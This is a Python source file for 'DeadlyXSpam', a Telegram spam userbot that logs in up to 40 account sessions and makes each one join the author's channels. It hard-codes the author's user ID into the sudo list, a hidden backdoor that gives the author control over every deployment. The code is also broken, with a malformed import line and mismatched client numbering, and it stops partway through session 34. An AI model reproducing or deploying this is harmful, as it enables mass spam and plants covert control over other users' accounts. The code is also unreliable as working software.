# DeadlyXSpam - Spam Userbots
# Copyright © 2021 @DEADLY_SPAMMER

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, 
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

Deadlyversion = "v2.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1876604648 not in SUDO_USERS:
    SUDO_USERS.append(1876604648)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 


# Sessions
async def DeadlyX():
    global Deadly
    global Deadly2
    global Deadly3
    global Deadly5
    global Deadly4
    global Deadly6
    global Deadly7
    global Deadly8
    global Deadly9
    global Deadly10
    global Deadly11
    global Deadly12
    global Deadly13
    global Deadly14
    global Deadly15
    global Deadly16
    global Deadly17
    global Deadly18
    global Deadly19
    global Deadly20
    global Deadly21
    global Deadly22
    global Deadly23
    global Deadly25
    global Deadly24
    global Deadly26
    global Deadly27
    global Deadly28
    global Deadly29
    global Deadly30
    global Deadly31
    global Deadly32
    global Deadly33
    global Deadly34
    global Deadly35
    global Deadly36
    global Deadly37
    global Deadly38
    global Deadly39
    global Deadly40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Deadly = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Deadly.start()
            botme = await Deadly.get_me()
            await Deadly(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Deadly = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "Deadlyxspam"
        Deadly = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        Deadly2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await Deadly2.start()
            await Deadly2(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly2(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly2(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        Deadly3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  Deadly3.start()
            await Deadly3(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly3(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly3(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        Deadly4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await Deadly4.start()
            await Deadly4(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly4(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly4(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        Deadly5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await Deadly5.start()
            await Deadly5(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly5(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly5(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        Deadly6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await Deadly6.start()
            await Deadly6(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly6(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly6(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        Deadly7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Deadly7.start()
            await Deadly7(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly7(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly7(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        Deadly8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await Deadly8.start()
            await Deadly8(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly8(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly8(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        Deadly9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await Deadly9.start()
            await Deadly9(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly9(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly9(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        Deadly10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await Deadly10.start()
            await Deadly10(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly10(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly10(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        Deadly11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await Deadly11.start()
            await Deadly11(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly11(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly11(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        Deadly12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await Deadly12.start()
            await Deadly12(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly12(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly12(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        Deadly13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await Deadly13.start()
            await Deadly13(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly13(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly13(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        Deadly14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Deadly14.start()
            await Deadly14(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly14(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly14(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        Deadly15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Deadly15.start()
            await Deadly15(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly15(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly15(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        Deadly16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Deadly16.start()
            botme = await Deadly16.get_me()
            await Deadly16(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly16(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly16(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "Deadlyxspam"
        Deadly16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        Deadly17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Deadly17.start()
            botme = await Deadly17.get_me()
            await Deadly17(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly17(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly17(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "Deadlyxspam"
        Deadly17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        Deadly18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Deadly18.start()
            botme = await Deadly18.get_me()
            await Deadly18(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly18(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly18(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "Deadlyxspam"
        Deadly18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        Deadly19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Deadly19.start()
            botme = await Deadly19.get_me()
            await Deadly19(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly19(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly19(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "Deadlyxspam"
        Deadly19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        Deadly20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Deadly20.start()
            botme = await Deadly20.get_me()
            await Deadly20(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly20(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly20(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "Deadlyxspam"
        Deadly20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        Deadly21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await Deadly21.start()
            botme = await Deadly21.get_me()
            await Deadly21(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly21(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly21(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = "Deadlyxspam"
        Deadly21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        Deadly22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Deadly22.start()
            await Deadly22(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly22(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly22(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        Deadly23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  Deadly23.start()
            await Deadly23(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly23(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly23(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        Deadly24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await Deadly24.start()
            await Deadly24(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly24(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly24(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        Deadly25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Deadly25.start()
            await Deadly25(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly25(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly25(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        Deadly26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await Deadly26.start()
            await Deadly26(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly26(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly26(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        Deadly27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await Deadly27.start()
            await Deadly27(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly27(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly27(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        Deadly28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Deadly28.start()
            await Deadly28(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly28(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly28(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        Deadly29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await Deadly29.start()
            await Deadly29(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly29(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly29(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        Deadly30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await Deadly30.start()
            await Deadly30(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly30(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly30(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        Deadly31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await Deadly31.start()
            await Deadly31(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly31(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly31(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        Deadly32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Deadly32.start()
            await Deadly32(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly32(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly32(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        Deadly33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await Deadly33.start()
            await Deadly33(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await Deadly33(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly33(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await Deadly33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = "Deadlyxspam"
        Deadly33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Deadly33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        Deadly34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await Deadly34.start()
            await Deadly34(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await Deadly34(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
